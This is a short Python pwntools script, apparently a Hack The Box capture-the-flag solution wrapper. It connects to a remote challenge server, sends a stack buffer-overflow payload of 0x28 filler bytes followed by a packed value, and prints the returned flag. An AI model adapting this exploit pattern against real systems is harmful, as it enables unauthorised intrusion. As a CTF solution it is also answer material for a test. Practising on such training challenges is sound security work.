#!/usr/bin/python3.8

'''
You need to install pwntools to run the script.
To run the script: python3 ./wrapper.py
'''

# Library
from pwn import *

# Open connection
IP   = '165.232.98.69' # Change this
PORT = 30866      # Change this

r = remote(IP, PORT)
# r = process('./gs')
pause()

# Craft payload
payload = b'A' * 0x28 + p64(0xa) # Change the number of "A"s

# Send payload
r.sendline(payload)

# Read flag
success(f'Flag --> {r.recvline_contains(b"HTB").strip().decode()}')